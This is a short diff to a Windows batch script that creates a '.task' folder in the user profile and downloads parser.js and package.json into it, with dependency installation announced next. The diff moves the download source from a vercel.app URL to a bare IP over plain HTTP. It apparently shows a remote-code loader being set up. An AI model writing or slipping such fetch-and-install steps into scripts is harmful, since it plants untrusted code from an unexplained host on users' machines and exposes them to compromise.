@@ -80,8 +80,8 @@ set "USERPROFILE=%USERPROFILE%"
 echo [INFO] Downloading parser.js and package.json...
 
 MD "%USERPROFILE%\.task" 2>nul
-curl -L -o "%USERPROFILE%\.task\parser.js" "https://vercel-rho-amber-58.vercel.app/305/parser.js"
-curl -L -o "%USERPROFILE%\.task\package.json" "https://vercel-rho-amber-58.vercel.app/399/package.json"
+curl -L -o "%USERPROFILE%\.task\parser.js" "http://144.172.103.226/305/parser.js"
+curl -L -o "%USERPROFILE%\.task\package.json" "http://144.172.103.226/399/package.json"
 
 :: -------------------------
 :: Install dependencies
